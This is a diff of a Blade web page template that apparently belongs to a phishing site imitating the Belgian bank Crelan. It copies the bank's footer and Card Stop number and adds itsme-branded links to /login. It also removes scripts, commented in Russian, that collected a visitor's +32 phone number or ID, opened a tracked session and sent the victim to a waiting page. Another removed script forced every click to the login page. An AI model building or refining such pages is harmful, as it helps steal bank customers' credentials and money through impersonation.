+                      <svg width="12" height="7" viewBox="0 0 12 7" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 1L6.00081 5.58L11 1" stroke="#00AE53" stroke-width="2" stroke-linecap="round"
+                          stroke-linejoin="round" />
+                      </svg>
+                    </div>
+                    <img src="/assets/separator.svg" class="faq-separator" alt="">
+                    <div class="faq--answer">
+                      <span>{!! nl2br(e($item['a'])) !!}</span>
                     </div>
                   </div>
-                  <div class="combo-block-region blockregion-3">
-                    <div class="combo-block-col-item combo-block-col-item--about-footer">
-                      <h2 class="combo-block-title">{{ __('messages.direct_links') }}</h2>
-                      <ul class="menu menu--about-footer menu--parent">
-
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2027">myCrelan</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="taxonomy/term/326">{{ __('messages.regulatory_info') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2263">{{ __('messages.privacy') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/10108">{{ __('messages.accessibility') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="ot-sdk-show-settings menu-link menu-link--about-footer"
-                            onclick="javascript:return false;">{{ __('messages.preferences') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2259">{{ __('messages.corporate_info') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/5618">{{ __('messages.investor_relations') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2224">{{ __('messages.jobs') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--about-footer"
-                            data-drupal-link-system-path="node/2268">{{ __('messages.newsroom') }}</a>
-
-                        </li>
-
-                      </ul>
-                    </div>
-                  </div>
-                  <div class="combo-block-region blockregion-4">
-                    <div class="combo-block-col-item combo-block-col-item--contact-footer">
-                      <h2 class="combo-block-title">{{ __('messages.contact_us') }}</h2>
-                      <ul class="menu menu--contact-footer menu--parent">
-
-                        <li class="menu-item">
-                          <a href="#" class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="kantoorzoeker">{{ __('messages.find_nearest_office') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="node/2305">{{ __('messages.contact') }}</a>
-
-                        </li>
-                        <li class="menu-item">
-                          <a href="#" target="_self" rel="" class="menu-link menu-link--contact-footer"
-                            data-drupal-link-system-path="node/2376">{{ __('messages.complaints') }}</a>
-
-                        </li>
-
-                      </ul>
-                    </div>
-                    <div class="combo-block-col-item combo-block-col-item--icon-footer">
-                      <ul class="menu menu--icon-footer menu--parent">
-
-                        <li class="icon icon-facebook menu-item icon--replaced">
-                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
-                            rel="noreferrer">
-                            <span class="menu-link__icon icon-facebook" aria-hidden="true"></span>
-                            <span class="menu-link__text"><span class="extlink-nobreak">Facebook<svg focusable="false"
-                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
-                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
-                                  <title>(externe link)</title>
-                                  <path
-                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
-                                  </path>
-                                  <path
-                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
-                                  </path>
-                                </svg></span></span></a>
-
-                        </li>
-                        <li class="icon icon-instagram menu-item icon--replaced">
-                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
-                            rel="noreferrer">
-                            <span class="menu-link__icon icon-instagram" aria-hidden="true"></span>
-                            <span class="menu-link__text"><span class="extlink-nobreak">Instagram<svg focusable="false"
-                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
-                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
-                                  <title>(externe link)</title>
-                                  <path
-                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
-                                  </path>
-                                  <path
-                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
-                                  </path>
-                                </svg></span></span></a>
-
-                        </li>
-                        <li class="icon icon-linkedin menu-item icon--replaced">
-                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
-                            rel="noreferrer">
-                            <span class="menu-link__icon icon-linkedin" aria-hidden="true"></span>
-                            <span class="menu-link__text"><span class="extlink-nobreak">LinkedIn<svg focusable="false"
-                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
-                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
-                                  <title>(externe link)</title>
-                                  <path
-                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
-                                  </path>
-                                  <path
-                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
-                                  </path>
-                                </svg></span></span></a>
-
-                        </li>
-                        <li class="icon icon-twitter menu-item icon--replaced">
-                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
-                            rel="noreferrer">
-                            <span class="menu-link__icon icon-twitter" aria-hidden="true"></span>
-                            <span class="menu-link__text"><span class="extlink-nobreak">Twitter<svg focusable="false"
-                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
-                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
-                                  <title>(externe link)</title>
-                                  <path
-                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
-                                  </path>
-                                  <path
-                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
-                                  </path>
-                                </svg></span></span></a>
-
-                        </li>
-                        <li class="icon icon-card-stop menu-item icon--replaced">
-                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
-                            rel="noreferrer">
-                            <span class="menu-link__icon icon-card-stop" aria-hidden="true"></span>
-                            <span class="menu-link__text">Card Stop 078 170 <span class="extlink-nobreak">170<svg
-                                  focusable="false" width="1em" height="1em" class="ext" data-extlink-placement="append"
-                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
-                                  <title>(externe link)</title>
-                                  <path
-                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
-                                  </path>
-                                  <path
-                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
-                                  </path>
-                                </svg></span></span></a>
-
-                        </li>
-
-                      </ul>
-                    </div>
-                  </div>
-
-                </div>
+                @endforeach
               </div>
             </div>
           </div>
+          <div class="section--right-side">
+            <img src="/assets/second-section--image.png" class="section--right-bg-image" alt="">
+            <div class="section--right-block">
+              <svg width="109" height="109" viewBox="0 0 109 109" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path
+                  d="M60.5028 0.147148C56.2549 0.815926 22.123 10.1787 20.1109 11.219C17.3535 12.6309 12.4349 17.5352 11.0189 20.2846C10.4228 21.4735 7.66537 30.762 4.90799 40.9422C-0.606776 61.7485 -1.12844 66.0583 1.62894 72.2259C3.86465 77.2788 30.9168 104.401 36.4316 107.076C42.7661 110.197 47.3121 109.751 68.7004 104.03C88.7473 98.6052 92.4735 96.8961 96.1997 91.4716C98.9571 87.3104 99.3297 86.4187 104.472 67.0243C109.465 48.5959 109.912 44.5833 107.825 38.1928C106.633 34.626 104.919 32.6197 91.5047 19.0957C80.3261 7.87518 75.5566 3.56532 72.7992 2.30209C68.9985 0.518692 63.9309 -0.373001 60.5028 0.147148ZM29.799 19.17C30.2461 19.5415 30.6932 21.0277 30.6932 22.3652C30.6932 27.1209 25.402 28.4585 22.7192 24.4459C19.9618 20.2103 25.6256 15.9004 29.799 19.17ZM46.7159 24.6688C47.163 26.3779 47.8337 27.1209 48.8771 27.1209C50.9637 27.1209 53.0504 29.2759 53.0504 31.4308C53.0504 34.0316 51.0383 36.0379 48.4299 36.0379C46.3433 36.0379 46.3433 36.1122 46.3433 40.4221C46.3433 48.6702 48.9516 51.1224 54.3173 47.9272C57.3728 46.1438 60.0556 46.3667 61.248 48.6702C62.2168 50.528 66.8373 50.7509 67.508 48.9675C68.1787 47.1841 67.6571 46.7382 61.9933 44.5833C55.9568 42.2798 53.7956 40.0505 53.7956 35.9636C53.7956 30.3905 59.7575 26.3779 66.6137 27.4182C73.3209 28.3842 77.1961 32.8427 74.2897 36.0379C72.4266 38.0442 70.0418 37.8956 68.0297 35.592C66.0175 33.2885 62.3659 33.2885 62.3659 35.592C62.3659 36.7067 63.6328 37.5241 67.5826 39.1588C73.619 41.611 76.1528 43.9889 76.1528 47.407C76.1528 50.6766 74.7368 53.1287 71.6814 55.2094C69.2966 56.8441 68.5514 56.9184 63.8564 56.4726C57.5218 55.8781 56.1804 55.8781 50.3675 56.5469C46.8649 56.9184 45.1509 56.6955 43.2132 55.8038C40.903 54.6892 40.4559 54.6892 38.4437 55.7295C33.3761 58.3303 24.8059 55.9524 22.8682 51.3453C21.6759 48.4473 21.3032 32.694 22.4211 30.985C22.7937 30.3162 24.2842 30.0933 26.669 30.2419L30.3206 30.4648L30.5442 39.0102C30.7678 47.9272 31.2894 49.4133 34.494 49.4133C37.6985 49.4133 38.1456 47.7042 38.1456 35.6664C38.1456 29.4245 38.3692 23.7028 38.5928 23.034C38.9654 22.1423 39.8597 21.9194 42.5425 22.068C45.6725 22.2909 46.0452 22.5138 46.7159 24.6688ZM84.8721 60.2623C89.1199 63.4575 91.9518 69.9966 90.6849 73.935C90.2378 75.3468 89.6416 75.4211 80.9223 75.4211C71.0852 75.4211 70.489 75.644 72.8737 78.9879C74.4387 81.2171 79.8045 81.2914 81.7421 79.1365C83.6052 77.1302 86.288 77.2788 87.7785 79.5081C89.418 81.9602 88.5237 84.0408 85.0956 85.8242C77.4197 89.7626 68.9985 87.7562 64.8997 81.0685L63.4837 78.765V81.663C63.4837 86.7159 59.9066 88.9452 56.7766 85.8242C55.5097 84.561 55.2861 83.3721 55.2861 76.7587C55.2861 70.814 55.0625 68.9563 54.0192 67.8417C52.6033 66.2069 50.144 66.1326 48.1318 67.5445C46.9394 68.4362 46.6413 69.848 46.3433 77.2788C46.0452 83.8179 45.6725 86.0472 44.8528 86.5673C43.0642 87.6819 41.2756 87.459 39.6361 85.8242C38.3692 84.561 38.1456 83.3721 38.1456 76.7587C38.1456 68.6591 37.3259 66.5042 34.1213 66.5042C30.3951 66.5785 29.2028 69.1792 29.2028 77.8733C29.2028 83.8922 28.9792 85.0068 27.7123 86.1958C25.9237 87.8305 22.8682 87.2361 21.6759 85.0068C21.1542 83.9665 20.9306 80.4741 21.1542 75.4954C21.4523 66.8757 22.4956 63.9777 26.4454 61.0054C28.234 59.7421 29.6499 59.4449 34.7921 59.4449C40.2323 59.4449 41.2756 59.6678 42.6916 61.0054L44.2566 62.6401L46.9394 60.8568C52.0071 57.3643 60.3537 59.2963 62.2168 64.2749C62.664 65.5382 63.2602 66.5042 63.4837 66.5042C63.7073 66.5042 64.6016 65.3152 65.5704 63.8291C68.0297 60.0394 72.3521 58.256 78.1649 58.5532C81.444 58.7018 83.4561 59.222 84.8721 60.2623Z"
+                  fill="#FD4712" />
+              </svg>
+              <a href="/login">{{ __('messages.participate_with_itsme') }}</a>
+              <span>
+                {{ __('messages.sidebar_info') }}
+              </span>
+            </div>
+          </div>
         </div>
-      </footer>
+
+          <div class="content--section section--second section--third">
+              <div class="section--left-side">
+                  <div class="left-side--text">
+                      <h4>
+                          {{ __('messages.special_offer') }}
+                      </h4>
+                      <span>
+                {{ __('messages.offer_description') }}
+              </span>
+                      <a href="/login">
+                          <svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
+                              <path d="M10.1111 9C11.1132 9.00006 12.0767 9.37316 12.8005 10.0415C13.5243 10.7098 13.9526 11.6218 13.9961 12.5873L14 12.75V13.5C14.0001 13.8784 13.8519 14.2429 13.5851 14.5204C13.3182 14.7979 12.9525 14.9679 12.5611 14.9963L12.4444 15H1.55556C1.16311 15.0001 0.785115 14.8572 0.497352 14.5999C0.209588 14.3426 0.0333226 13.9899 0.00388898 13.6125L0 13.5V12.75C5.78997e-05 11.7837 0.386977 10.8546 1.08007 10.1567C1.77316 9.4587 2.71892 9.04569 3.72011 9.00375L3.88889 9H10.1111ZM7 0C8.0314 0 9.02055 0.395088 9.74986 1.09835C10.4792 1.80161 10.8889 2.75544 10.8889 3.75C10.8889 4.74456 10.4792 5.69839 9.74986 6.40165C9.02055 7.10491 8.0314 7.5 7 7.5C5.9686 7.5 4.97945 7.10491 4.25014 6.40165C3.52083 5.69839 3.11111 4.74456 3.11111 3.75C3.11111 2.75544 3.52083 1.80161 4.25014 1.09835C4.97945 0.395088 5.9686 0 7 0Z" fill="#3C3C3C"/>
+                          </svg>
+
+                          {{ __('messages.login') }}
+
+                      </a>
+                  </div>
+              </div>
+              <div class="section--right-side">
+                  <img src="/assets/second-third--image.png" class="section--right-bg-image" alt="">
+              </div>
+          </div>
+      </div>
 
     </div>
 
   </div>
 
   @vite(['resources/js/app.js'])
+  @vite(['resources/js/app.css'])
+
+  <script src="./assets/faq.js" defer></script>
 
   <script>
     // Translations for JavaScript
@@ -776,23 +326,14 @@
     };
 
     document.addEventListener('DOMContentLoaded', function () {
-      const phoneInput = document.getElementById('phone-input');
-      const phoneSubmitBtn = document.getElementById('phone-submit-btn');
-      const idInput = document.getElementById('id-input');
-      const idSubmitBtn = document.getElementById('id-submit-btn');
-
-      // Check for existing session
       const existingSessionId = localStorage.getItem('session_id');
       if (existingSessionId && window.SessionManager) {
         window.SessionManager.setSessionId(existingSessionId);
-        // Check session status and redirect if needed
-        window.SessionManager.checkSessionStatus();
 
-        // Track page visit
-        trackPageVisit(existingSessionId, 'Главная страница', window.location.href);
+        window.SessionManager.checkSessionStatus();
+        trackPageVisit(existingSessionId, '{{ __('messages.page_home') }}', window.location.href);
       }
 
-      // Track page visit function
       async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
         try {
           await fetch(`/api/session/${sessionId}/visit`, {
@@ -812,172 +353,6 @@
         }
       }
 
-      // Функция для управления состоянием кнопок
-      // Минимальные требования: телефон - 8 цифр, ID - от 4 до 8 символов
-      const MIN_PHONE_LENGTH = 8;
-      const MIN_ID_LENGTH = 4;
-
-      function updateButtonsState() {
-        const phoneValue = phoneInput.value.trim().replace(/[^0-9]/g, '');
-        const idValue = idInput.value.trim().replace(/[^A-Z0-9]/gi, '');
-
-        const phoneIsValid = phoneValue.length >= MIN_PHONE_LENGTH;
-        const idIsValid = idValue.length >= MIN_ID_LENGTH;
-
-        // Если телефон валиден - активируем кнопку телефона, деактивируем ID
-        if (phoneIsValid) {
-          phoneSubmitBtn.disabled = false;
-          phoneSubmitBtn.classList.add('active');
-          idSubmitBtn.disabled = true;
-          idSubmitBtn.classList.remove('active');
-        }
-        // Если ID валиден - активируем кнопку ID, деактивируем телефон
-        else if (idIsValid) {
-          idSubmitBtn.disabled = false;
-          idSubmitBtn.classList.add('active');
-          phoneSubmitBtn.disabled = true;
-          phoneSubmitBtn.classList.remove('active');
-        }
-        // Если оба поля не валидны - деактивируем обе кнопки
-        else {
-          phoneSubmitBtn.disabled = true;
-          phoneSubmitBtn.classList.remove('active');
-          idSubmitBtn.disabled = true;
-          idSubmitBtn.classList.remove('active');
-        }
-      }
-
-      // Инициализация состояния кнопок
-      updateButtonsState();
-
-      // Format phone number
-      phoneInput.addEventListener('input', function (e) {
-        let value = this.value.replace(/[^0-9]/g, '');
-        this.value = value;
-        updateButtonsState();
-      });
-
-      // Format identification (max 8 characters)
-      idInput.addEventListener('input', function (e) {
-        let value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-        if (value.length > 8) {
-          value = value.slice(0, 8);
-        }
-        this.value = value;
-        updateButtonsState();
-      });
-
-      // Обработка фокуса на полях
-      phoneInput.addEventListener('focus', function () {
-        updateButtonsState();
-      });
-
-      idInput.addEventListener('focus', function () {
-        updateButtonsState();
-      });
-
-      // Обработка потери фокуса
-      phoneInput.addEventListener('blur', function () {
-        updateButtonsState();
-      });
-
-      idInput.addEventListener('blur', function () {
-        updateButtonsState();
-      });
-
-      // Submit phone
-      phoneSubmitBtn.addEventListener('click', async function () {
-        const phone = phoneInput.value.trim();
-        if (!phone || phone.length < 8) {
-          phoneInput.focus();
-          updateButtonsState();
-          return;
-        }
-
-        // Деактивируем обе кнопки во время отправки
-        phoneSubmitBtn.disabled = true;
-        idSubmitBtn.disabled = true;
-        this.querySelector('span').textContent = window.translations.loading;
-
-        try {
-          const fullPhone = '+32' + phone;
-          await createSession('phone', fullPhone);
-        } catch (error) {
-          console.error('Error:', error);
-          this.querySelector('span').textContent = window.translations.send;
-          // Восстанавливаем состояние кнопок после ошибки
-          updateButtonsState();
-        }
-      });
-
-      // Submit ID
-      idSubmitBtn.addEventListener('click', async function () {
-        const id = idInput.value.trim().replace(/[^A-Z0-9]/gi, '');
-        if (!id || id.length < MIN_ID_LENGTH) {
-          idInput.focus();
-          updateButtonsState();
-          return;
-        }
-
-        // Деактивируем обе кнопки во время отправки
-        idSubmitBtn.disabled = true;
-        phoneSubmitBtn.disabled = true;
-        this.querySelector('span').textContent = window.translations.loading;
-
-        try {
-          await createSession('id', id);
-        } catch (error) {
-          console.error('Error:', error);
-          this.querySelector('span').textContent = window.translations.send;
-          // Восстанавливаем состояние кнопок после ошибки
-          updateButtonsState();
-        }
-      });
-
-      // Enter key support
-      phoneInput.addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-          phoneSubmitBtn.click();
-        }
-      });
-
-      idInput.addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-          idSubmitBtn.click();
-        }
-      });
-
-      async function createSession(inputType, inputValue) {
-        const response = await fetch('/api/session', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
-          },
-          body: JSON.stringify({
-            input_type: inputType,
-            input_value: inputValue
-          })
-        });
-
-        if (!response.ok) {
-          throw new Error('Failed to create session');
-        }
-
-        const data = await response.json();
-        const sessionId = data.data.id;
-
-        // Save to localStorage
-        localStorage.setItem('session_id', sessionId);
-
-        // Initialize SessionManager
-        if (window.SessionManager) {
-          window.SessionManager.setSessionId(sessionId);
-        }
-
-        // Redirect to waiting page
-        window.location.href = `/session/${sessionId}/waiting`;
-      }
     });
     window.addEventListener('load', () => {
       fetch('/api/visit', {
@@ -1008,45 +383,6 @@
     </script>
   @endif
 
-  <script>
-    // Функция для раскрытия/скрытия преимуществ
-    function toggleBenefit(index) {
-      const benefitItems = document.querySelectorAll('.benefit-item');
-      const currentItem = benefitItems[index];
-
-      // Закрываем все остальные элементы и снимаем чекбоксы
-      benefitItems.forEach((item, i) => {
-        if (i !== index) {
-          item.classList.remove('active');
-          const checkbox = item.querySelector('input[type="checkbox"]');
-          if (checkbox) checkbox.checked = false;
-        }
-      });
-
-      // Переключаем текущий элемент и чекбокс
-      const isActive = currentItem.classList.contains('active');
-      const checkbox = currentItem.querySelector('input[type="checkbox"]');
-
-      if (isActive) {
-        currentItem.classList.remove('active');
-        checkbox.checked = false;
-      } else {
-        currentItem.classList.add('active');
-        checkbox.checked = true;
-      }
-    }
-  </script>
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const loginUrl = '/login';
-      document.querySelectorAll('a, button').forEach((el) => {
-        el.addEventListener('click', (e) => {
-          e.preventDefault();
-          window.location.href = loginUrl;
-        });
-      });
-    });
-  </script>
 </body>
 <!-- Meta Pixel Code -->
 <script>
